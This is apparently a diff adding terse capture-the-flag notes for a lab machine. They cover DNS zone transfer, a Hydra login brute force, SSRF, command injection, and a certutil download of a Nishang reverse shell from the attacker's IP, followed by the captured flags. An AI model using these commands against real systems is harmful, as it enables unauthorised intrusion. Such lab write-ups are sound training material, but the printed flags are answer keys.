@@ -1,0 +1,50 @@
+Ip : 10.10.224.102
+Domain : ironcorp.me
+
+- nmap scans reveals several ports including 53, 135, 3389, 8080 etc
+- there are 2 sites running on different ports 8080 and 11025
+- visiting both the sites doesnt take us anywhere
+- using dig against ip and domain we got 2 more subdomains    
+	dig @10.10.224.102 ironcorp.me axfr 
+
+- 	admin.ironcorp.me
+	internal.ironcorp.me
+
+- checked both and only one worked admin.ironcorp.me:11025
+- asked us to login 
+- we brute force the login with hydra by guessing the username as admin
+	hydra -l admin -P /opt/SecLists/Passwords/richelieu-french-top5000.txt -s 11025 admin.ironcorp.me http-get
+
+creds : admin : password123
+
+- we logged in with the credentials 
+- it presented us with a search page asking us to search for any queries 
+- guessed that the site might be vulnerable to SSRF 
+- tested it with a python server and asample file and it successfull printed the contents of the file in the window 
+-we can use this feature to do an internal port scan
+- we try to access the subdomain which wasnt accessible to us before and succeeded 
+- alter the url to get the username
+	http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=
+
+- we get a username back as Equinox
+- we try enumerating on the url field and find that we can run commands from the url
+- we try with a simple whoami and got the result back
+- we download the nishang powershell reverse shell and serve it with a python server
+- start burpsuite and intercept the request with burp and add the certutil command to download our reverse shell from the python server in a doouble url encoded form
+	http://internal.ironcorp.me:11025/name.php?name=Equinox|Certutil%2b-urlcache%2b-f%2bhttp%253a//10.8.179.136%253a1234/nish.ps1%2bnish.ps1
+
+- we successfully got the reverse shell on the machine 
+- start a listener with netcat
+- run the reverse shell with powershell
+	http://internal.ironcorp.me:11025/name.php?name=Equinox|powershell.exe%2b.\nish.ps1 
+
+- we have a shell now 
+- grab the user flag
+- when we try to access the superadmin directory the access id denied
+- trying to read the root.txt directly and we ot the flag 
+- flags : 
+	thm{09b408056a13fc222f33e6e4cf599f8c}
+	thm{a1f936a086b367761cc4e7dd6cd2e2bd}
+
+ 
+
